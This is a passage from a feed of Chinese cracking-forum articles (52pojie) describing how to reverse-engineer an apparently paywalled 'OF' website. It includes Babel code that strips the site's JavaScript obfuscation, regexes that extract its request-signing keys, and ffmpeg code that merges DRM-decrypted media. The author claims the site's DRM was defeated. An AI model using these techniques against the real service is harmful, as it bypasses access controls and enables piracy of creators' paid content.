68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>((resolve) =&gt; {<br />      <span style="color: rgb(255, 255, 182);">ffmpeg</span>().<span style="color: rgb(255, 255, 182);">input</span>(mergeFile[<span style="color: rgb(255, 115, 253);">0</span>]).<span style="color: rgb(255, 255, 182);">input</span>(mergeFile[<span style="color: rgb(255, 115, 253);">1</span>]).<span style="color: rgb(255, 255, 182);">audioCodec</span>(<span style="color: rgb(168, 255, 96);">'copy'</span>).<span style="color: rgb(255, 255, 182);">videoCodec</span>(<span style="color: rgb(168, 255, 96);">'copy'</span>).<span style="color: rgb(255, 255, 182);">output</span>(baseDir + <span style="color: rgb(168, 255, 96);">'/decrypt_drm_'</span> + mediaItem.id + <span style="color: rgb(168, 255, 96);">'.mp4'</span>)<br />        .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'error'</span>, <span style="color: rgb(150, 203, 254);">function</span> (err) {<br />          <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'An error occurred: '</span> + err.message);        })<br />        .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'end'</span>, <span style="color: rgb(150, 203, 254);">function</span> () {<br />          <span style="color: rgb(255, 255, 182);">resolve</span>();        })<br />        .<span style="color: rgb(255, 255, 182);">run</span>();<br />    })</code></pre><p>最后调用deleteVideoFiles分别删除残余文件</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">  <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">deleteVideoFiles</span>(baseDir, mediaItem.id + <span style="color: rgb(168, 255, 96);">''</span>)<br />  <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">deleteVideoFiles</span>(baseDir, <span style="color: rgb(168, 255, 96);">'drm_'</span> + mediaItem.id)</code></pre><p>这里的删除是我组合的功能函数，也抄了网上的<br />传入路径和文件前缀就可以自动删除</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">deleteFiles</span>(files, callback) {<br />  <span style="color: rgb(150, 203, 254);">if</span> (files.length == <span style="color: rgb(255, 115, 253);">0</span>) {<br />    <span style="color: rgb(255, 255, 182);">callback</span>()  }<br />  <span style="color: rgb(150, 203, 254);">var</span> i = files.length;<br />  files.<span style="color: rgb(255, 255, 182);">forEach</span>(<span style="color: rgb(150, 203, 254);">function</span> (filepath) {<br />    fs.<span style="color: rgb(255, 255, 182);">unlink</span>(filepath, <span style="color: rgb(150, 203, 254);">function</span> (err) {      i--;<br />      <span style="color: rgb(150, 203, 254);">if</span> (err) {<br />        <span style="color: rgb(255, 255, 182);">callback</span>(err);<br />        <span style="color: rgb(150, 203, 254);">return</span>;<br />      } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (i &lt;= <span style="color: rgb(255, 115, 253);">0</span>) {<br />        <span style="color: rgb(255, 255, 182);">callback</span>(<span style="color: rgb(198, 197, 254);">null</span>);      }    });  });}<br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">deleteVideoFiles</span>(path, id) {<br />  <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>(<span style="color: rgb(150, 203, 254);">async</span> (resolve) =&gt; {<br />    <span style="color: rgb(150, 203, 254);">const</span> files = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">getVideoFiles</span>(path, id)<br />    <span style="color: rgb(255, 255, 182);">deleteFiles</span>(files, resolve)  })<br />}</code></pre><p>那么就实现了OF网站的drm解密啦！因为没法贴图，所以在这里晒一下我的猫猫狗狗吧<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=29d7310b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOLbQaTgeHwnN3sa2bH5aibFA1QEJ1k9liawOYcGkjKvjavZibOeekPlmPA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>完结撒花~</span></p><p>严肃的来讲，这次的解密之旅陆陆续续花了我半个月从动态ob的解密到分析到videojs，再到发现drm，drm的尝试解密，wvd的提取，再到证书的设置，0804的起源得到了许多人的帮助并不是我一个人的成果十分感激大家在此就不一一列举名字了<br />所以在此感谢依然相信爱与正义的人！</p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1939939-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 05 Jul 2024 14:57:42 +0800</pubDate>
</item>
<item>
<title>【Web逆向】某OF网站的OB解密及DRM过校验思路(上)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140842&amp;idx=1&amp;sn=f53fa138714cf11b8a935f2f3e3114be&amp;chksm=bd50a2be8a272ba8c990f6f62e2525037deef2b4418714d707d4ef692ee7d4c6b36438a73bad&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140842&amp;idx=1&amp;sn=f53fa138714cf11b8a935f2f3e3114be&amp;chksm=bd50a2be8a272ba8c990f6f62e2525037deef2b4418714d707d4ef692ee7d4c6b36438a73bad&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-07-05 14:51</span> <span style="display: inline-block;">北京</span>
</p>

<p>感谢videohelp论坛larley大神的解答！感谢吾爱破解论坛@涛之雨大神的帮助！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=b6487767&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOjZgt6xR1ia5pFV8BUia4w0Q9ccBmDT4Mcu8ogCtddvqFJaxP2CueMMIA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>李恒道</strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>感谢videohelp论坛larley大神的解答！<br />感谢吾爱破解论坛@涛之雨大神的帮助</p><p><img border="0" class="rich_pages wxw-img" height="445" src="https://wechat2rss.xlab.app/img-proxy/?k=016bbbb8&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOBh24bicxpIWpeUIpbKCeQnZ0OVGptibMSYsbK2VfOuUicHhNac1icjxy9Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><span>首先第一层是标准的OB加密</span><br /><span>我们先大概规整一下代码</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(255, 255, 182);">traverse</span>(ast, {<br />        <span style="color: rgb(255, 255, 182);">CallExpression</span>(path) {<br />            <span style="color: rgb(150, 203, 254);">if</span> (path.node.arguments.length === <span style="color: rgb(255, 115, 253);">2</span>) {<br />                <span style="color: rgb(150, 203, 254);">const</span> type0 = path.node.arguments[<span style="color: rgb(255, 115, 253);">0</span>].type<br />                <span style="color: rgb(150, 203, 254);">const</span> type1 = path.node.arguments[<span style="color: rgb(255, 115, 253);">1</span>].type<br />                <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">isLikelyNumber</span> = (type) =&gt; {<br />                    <span style="color: rgb(150, 203, 254);">return</span> type === <span style="color: rgb(168, 255, 96);">'UnaryExpression'</span> || type === <span style="color: rgb(168, 255, 96);">'NumericLiteral'</span>                }<br />                <span style="color: rgb(150, 203, 254);">if</span> ((type0 === <span style="color: rgb(168, 255, 96);">'StringLiteral'</span> &amp;&amp; <span style="color: rgb(255, 255, 182);">isLikelyNumber</span>(type1)) || (type1 === <span style="color: rgb(168, 255, 96);">'StringLiteral'</span> &amp;&amp; <span style="color: rgb(255, 255, 182);">isLikelyNumber</span>(type0))) {<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcBinding = path.scope.<span style="color: rgb(255, 255, 182);">getBinding</span>(path.node.callee.name)<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcNode = funcBinding.path.node<br />                    <span style="color: rgb(150, 203, 254);">if</span> (funcNode?.params?.length !== <span style="color: rgb(255, 115, 253);">2</span>) {<br />                        <span style="color: rgb(150, 203, 254);">return</span>                    }<br />                    <span style="color: rgb(150, 203, 254);">if</span> (funcNode.body.body.length !== <span style="color: rgb(255, 115, 253);">1</span>) {<br />                        <span style="color: rgb(150, 203, 254);">return</span>                    }<br />                    <span style="color: rgb(150, 203, 254);">if</span> (funcNode.body.body[<span style="color: rgb(255, 115, 253);">0</span>].type !== <span style="color: rgb(168, 255, 96);">'ReturnStatement'</span>) {<br />                        <span style="color: rgb(150, 203, 254);">return</span>                    }<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcArgs0 = funcNode.params[<span style="color: rgb(255, 115, 253);">0</span>].name<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcArgs1 = funcNode.params[<span style="color: rgb(255, 115, 253);">1</span>].name<br />                    <span style="color: rgb(150, 203, 254);">const</span> bodyCallArgs = funcNode.body.body[<span style="color: rgb(255, 115, 253);">0</span>].argument.arguments<br />                    <span style="color: rgb(150, 203, 254);">let</span> isSwap = <span style="color: rgb(198, 197, 254);">false</span><br />                    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> index = <span style="color: rgb(255, 115, 253);">0</span>; index &lt; bodyCallArgs.length; index++) {<br />                        <span style="color: rgb(150, 203, 254);">const</span> item = bodyCallArgs[index];<br />                        <span style="color: rgb(150, 203, 254);">if</span> (item.type === <span style="color: rgb(168, 255, 96);">'Identifier'</span>) {<br />                            <span style="color: rgb(150, 203, 254);">if</span> (item.name === funcArgs0 &amp;&amp; index === <span style="color: rgb(255, 115, 253);">1</span>) {<br />                                isSwap = <span style="color: rgb(198, 197, 254);">true</span><br />                            } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (item.name === funcArgs1 &amp;&amp; index === <span style="color: rgb(255, 115, 253);">0</span>) {<br />                                isSwap = <span style="color: rgb(198, 197, 254);">true</span>                            }<br />                            <span style="color: rgb(150, 203, 254);">break</span>;                        }                    }<br />                    <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">handleExpression</span> = (bodyExpress, argsIdentifier) =&gt; {<br />                        <span style="color: rgb(150, 203, 254);">if</span> (bodyExpress.type !== <span style="color: rgb(168, 255, 96);">'BinaryExpression'</span>) {<br />                            <span style="color: rgb(150, 203, 254);">return</span> argsIdentifier                        }<br />                        <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">handleIdentifier</span> = (item) =&gt; {<br />                            <span style="color: rgb(150, 203, 254);">if</span> (item.type !== <span style="color: rgb(168, 255, 96);">'Identifier'</span>) {<br />                                <span style="color: rgb(150, 203, 254);">return</span> item<br />                            } <span style="color: rgb(150, 203, 254);">else</span> {<br />                                <span style="color: rgb(150, 203, 254);">return</span> argsIdentifier                            }                        }<br />                        <span style="color: rgb(150, 203, 254);">const</span> numAst = types.<span style="color: rgb(255, 255, 182);">binaryExpression</span>(bodyExpress.operator, <span style="color: rgb(255, 255, 182);">handleIdentifier</span>(bodyExpress.left), <span style="color: rgb(255, 255, 182);">handleIdentifier</span>(bodyExpress.right))<br />                        <span style="color: rgb(150, 203, 254);">const</span> numResult = eval(<span style="color: rgb(255, 255, 182);">generator</span>(numAst).code)<br />                        <span style="color: rgb(150, 203, 254);">return</span> types.<span style="color: rgb(255, 255, 182);">numericLiteral</span>(numResult)                    }<br />                    <span style="color: rgb(150, 203, 254);">const</span> firstIdentifier = path.node.arguments[<span style="color: rgb(255, 115, 253);">0</span>]<br />                    <span style="color: rgb(150, 203, 254);">const</span> secondIdentifier = path.node.arguments[<span style="color: rgb(255, 115, 253);">1</span>]<br />                    <span style="color: rgb(150, 203, 254);">let</span> newCalleeArgs = [<span style="color: rgb(255, 255, 182);">handleExpression</span>(bodyCallArgs[<span style="color: rgb(255, 115, 253);">0</span>], isSwap ? secondIdentifier : firstIdentifier), <span style="color: rgb(255, 255, 182);">handleExpression</span>(bodyCallArgs[<span style="color: rgb(255, 115, 253);">1</span>], isSwap ? firstIdentifier : secondIdentifier)]<br />                    <span style="color: rgb(150, 203, 254);">let</span> newNode = types.<span style="color: rgb(255, 255, 182);">callExpression</span>(funcNode.body.body[<span style="color: rgb(255, 115, 253);">0</span>].argument.callee, newCalleeArgs);<br />                    path.<span style="color: rgb(255, 255, 182);">replaceInline</span>(newNode)                }            }        },<br />    });</code></pre><p>然后获取解密的函数，这里因为比较偷懒，所以直接使用了正则表达式计算关键函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">generatorHandleCrackStringFunc</span>(text) {<br />    <span style="color: rgb(150, 203, 254);">const</span> matchResult = text.<span style="color: rgb(255, 255, 182);">match</span>(<span style="color: rgb(233, 192, 98);">/\d{4,}\);\s?(function.*),\s?[A-Za-z].[A-Za-z]\s?=\s?[A-Za-z]/</span>)<br />    <span style="color: rgb(150, 203, 254);">if</span> (matchResult.length !== <span style="color: rgb(255, 115, 253);">2</span>) {<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Error</span>(<span style="color: rgb(168, 255, 96);">'代码解析失败！'</span>)    }<br />    <span style="color: rgb(150, 203, 254);">const</span> funcName = matchResult[<span style="color: rgb(255, 115, 253);">1</span>].<span style="color: rgb(255, 255, 182);">match</span>(<span style="color: rgb(233, 192, 98);">/function ([A-Za-z])\([A-Za-z],\s?[A-Za-z]\).*(?=abc)/</span>)[<span style="color: rgb(255, 115, 253);">1</span>]<br />    <span style="color: rgb(150, 203, 254);">return</span> {        crackName: funcName,<br />        crackCharFunc: <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Function</span>([], matchResult[<span style="color: rgb(255, 115, 253);">1</span>] + <span style="color: rgb(168, 255, 96);">';return function(num,char){return '</span> + funcName + <span style="color: rgb(168, 255, 96);">'(num, char)}'</span>)()    }<br />}</code></pre><p>然后调用解密函数</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(255, 255, 182);">traverse</span>(ast, {<br />        <span style="color: rgb(255, 255, 182);">CallExpression</span>(path) {<br />            <span style="color: rgb(150, 203, 254);">if</span> (path.node.arguments.length === <span style="color: rgb(255, 115, 253);">2</span>) {<br />                <span style="color: rgb(150, 203, 254);">if</span> (path.node.callee.name !== name) {<br />                    <span style="color: rgb(150, 203, 254);">return</span>                }<br />                <span style="color: rgb(150, 203, 254);">if</span> (path.node.arguments[<span style="color: rgb(255, 115, 253);">0</span>].type !== <span style="color: rgb(168, 255, 96);">'NumericLiteral'</span>) {<br />                    <span style="color: rgb(150, 203, 254);">return</span>;                }<br />                <span style="color: rgb(150, 203, 254);">if</span> (path.node.arguments[<span style="color: rgb(255, 115, 253);">1</span>].type !== <span style="color: rgb(168, 255, 96);">'StringLiteral'</span>) {<br />                    <span style="color: rgb(150, 203, 254);">return</span>;                }<br />                <span style="color: rgb(150, 203, 254);">const</span> nodeResult = <span style="color: rgb(255, 255, 182);">handleStringFunc</span>(path.node.arguments[<span style="color: rgb(255, 115, 253);">0</span>].value, path.node.arguments[<span style="color: rgb(255, 115, 253);">1</span>].value)<br />                path.<span style="color: rgb(255, 255, 182);">replaceInline</span>(types.<span style="color: rgb(255, 255, 182);">stringLiteral</span>(nodeResult))            }        },<br />    });</code></pre><p>然后对解密后的字符串和数字等做一下合并</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">const</span> handleObfs = {<br />        <span style="color: rgb(255, 255, 182);">CallExpression</span>: {<br />            <span style="color: rgb(255, 255, 182);">exit</span>(outerPath) {<br />                <span style="color: rgb(150, 203, 254);">const</span> node = outerPath.node.callee<br />                <span style="color: rgb(150, 203, 254);">const</span> parentPath = outerPath<br />                <span style="color: rgb(150, 203, 254);">if</span> (node?.object?.type === <span style="color: rgb(168, 255, 96);">'Identifier'</span> &amp;&amp; node?.property?.type === <span style="color: rgb(168, 255, 96);">'StringLiteral'</span>) {<br />                    <span style="color: rgb(150, 203, 254);">const</span> objBinding = outerPath.scope.<span style="color: rgb(255, 255, 182);">getBinding</span>(node.object.name)<br />                    <span style="color: rgb(150, 203, 254);">if</span> (objBinding === <span style="color: rgb(198, 197, 254);">undefined</span>) {<br />                        <span style="color: rgb(150, 203, 254);">return</span>;                    }<br />                    <span style="color: rgb(150, 203, 254);">const</span> objNode = objBinding.path.node<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcList = objNode.init?.properties ?? []<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcInstance = funcList.<span style="color: rgb(255, 255, 182);">find</span>((item) =&gt; {<br />                        <span style="color: rgb(150, 203, 254);">const</span> keyName = item.key.name<br />                        <span style="color: rgb(150, 203, 254);">return</span> keyName === node.property.value                    })<br />                    <span style="color: rgb(150, 203, 254);">if</span> (funcInstance) {<br />                        <span style="color: rgb(150, 203, 254);">const</span> parentNode = parentPath.node<br />                        <span style="color: rgb(150, 203, 254);">let</span> replaceAst = <span style="color: rgb(198, 197, 254);">null</span><br />                        <span style="color: rgb(150, 203, 254);">if</span> (funcInstance.value.type === <span style="color: rgb(168, 255, 96);">'FunctionExpression'</span>) {<br />                            <span style="color: rgb(150, 203, 254);">const</span> originNode = funcInstance.value.body.body[<span style="color: rgb(255, 115, 253);">0</span>].argument<br />                            <span style="color: rgb(146, 255, 184);">//函数</span><br />                            <span style="color: rgb(150, 203, 254);">if</span> (originNode.type === <span style="color: rgb(168, 255, 96);">'CallExpression'</span>) {<br />                                replaceAst = types.<span style="color: rgb(255, 255, 182);">callExpression</span>(parentNode.arguments[<span style="color: rgb(255, 115, 253);">0</span>], [...parentNode.arguments].<span style="color: rgb(255, 255, 182);">splice</span>(<span style="color: rgb(255, 115, 253);">1</span>))<br />                            } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (originNode.type === <span style="color: rgb(168, 255, 96);">'BinaryExpression'</span>) {<br />                                replaceAst = types.<span style="color: rgb(255, 255, 182);">binaryExpression</span>(originNode.operator, parentNode.arguments[<span style="color: rgb(255, 115, 253);">0</span>], parentNode.arguments[<span style="color: rgb(255, 115, 253);">1</span>])                            }<br />                        } <span style="color: rgb(150, 203, 254);">else</span> {<br />                            <span style="color: rgb(146, 255, 184);">//字符串</span><br />                            <span style="color: rgb(150, 203, 254);">debugger</span><br />                            replaceAst = types.<span style="color: rgb(255, 255, 182);">stringLiteral</span>(funcInstance.value.value)                        }<br />                        <span style="color: rgb(150, 203, 254);">if</span> (replaceAst) {<br />                            parentPath.<span style="color: rgb(255, 255, 182);">replaceWith</span>(replaceAst)                        }                    }                }            }        },<br />        <span style="color: rgb(255, 255, 182);">MemberExpression</span>: {<br />            <span style="color: rgb(255, 255, 182);">enter</span>(path) {<br />                <span style="color: rgb(150, 203, 254);">const</span> node = path.node<br />                <span style="color: rgb(150, 203, 254);">if</span> (node?.object?.type === <span style="color: rgb(168, 255, 96);">'Identifier'</span> &amp;&amp; node?.property?.type === <span style="color: rgb(168, 255, 96);">'StringLiteral'</span>) {<br />                    <span style="color: rgb(150, 203, 254);">const</span> objBinding = path.scope.<span style="color: rgb(255, 255, 182);">getBinding</span>(node.object.name)<br />                    <span style="color: rgb(150, 203, 254);">if</span> (objBinding === <span style="color: rgb(198, 197, 254);">undefined</span>) {<br />                        <span style="color: rgb(150, 203, 254);">return</span>;                    }<br />                    <span style="color: rgb(150, 203, 254);">const</span> objNode = objBinding.path.node<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcList = objNode.init?.properties ?? []<br />                    <span style="color: rgb(150, 203, 254);">const</span> funcInstance = funcList.<span style="color: rgb(255, 255, 182);">find</span>((item) =&gt; {<br />                        <span style="color: rgb(150, 203, 254);">const</span> keyName = item.key.name<br />                        <span style="color: rgb(150, 203, 254);">return</span> keyName === node.property.value                    })<br />                    <span style="color: rgb(150, 203, 254);">if</span> (funcInstance) {<br />                        <span style="color: rgb(150, 203, 254);">let</span> replaceAst = <span style="color: rgb(198, 197, 254);">null</span><br />                        <span style="color: rgb(150, 203, 254);">if</span> (funcInstance.value.type === <span style="color: rgb(168, 255, 96);">'StringLiteral'</span>) {<br />                            replaceAst = types.<span style="color: rgb(255, 255, 182);">stringLiteral</span>(funcInstance.value.value)                        }<br />                        <span style="color: rgb(150, 203, 254);">if</span> (replaceAst) {<br />                            path.<span style="color: rgb(255, 255, 182);">replaceWith</span>(replaceAst)                        }                    }                }            }        }    }<br />    <span style="color: rgb(255, 255, 182);">traverse</span>(ast, handleObfs);</code></pre><p>我们可以从已经解密的文件里提取一些关键字符串</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">const</span> mathRsult = code.<span style="color: rgb(255, 255, 182);">match</span>(<span style="color: rgb(233, 192, 98);">/\[\"(.*)\", [a-zA-Z]\[\"time\"\][\s\S]*\[\"sign\"\] = \[\"([0-9]*)\".*function \(([a-zA-Z])\) {([\s\S]*)}\([a-zA-Z]\)\,.*?"([a-zA-Z0-9]{3,})"/</span>)<br />    <span style="color: rgb(150, 203, 254);">if</span> (mathRsult.length !== <span style="color: rgb(255, 115, 253);">6</span>) {<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Error</span>(<span style="color: rgb(168, 255, 96);">'密钥解析失败！'</span>)    }<br />    <span style="color: rgb(150, 203, 254);">const</span> signPrefix = mathRsult[<span style="color: rgb(255, 115, 253);">2</span>]<br />    <span style="color: rgb(150, 203, 254);">const</span> signEnd = mathRsult[<span style="color: rgb(255, 115, 253);">5</span>]<br />    <span style="color: rgb(150, 203, 254);">const</span> prefixToken = mathRsult[<span style="color: rgb(255, 115, 253);">1</span>]<br />    <span style="color: rgb(150, 203, 254);">const</span> hashFunc = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Function</span>(mathRsult[<span style="color: rgb(255, 115, 253);">3</span>], mathRsult[<span style="color: rgb(255, 115, 253);">4</span>])</code></pre><p>接下来直接调试可以解出来BCToken的算法</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; 